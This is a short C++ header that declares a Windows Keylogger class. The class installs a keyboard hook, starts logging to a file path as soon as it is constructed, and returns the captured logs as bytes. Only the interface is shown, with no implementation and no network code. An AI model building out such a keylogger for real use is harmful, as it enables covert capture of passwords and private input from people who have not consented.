#pragma once

#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>

class Keylogger
{
private:
	std::string m_path;
	HANDLE hThread;

public:
	explicit Keylogger(const char *path) : m_path(path) { Start(); }
	~Keylogger() { Stop();  }

	bool SetKeyboardHook();
	void Start();
	void Stop() noexcept;

	std::vector<byte> GetLogs();
};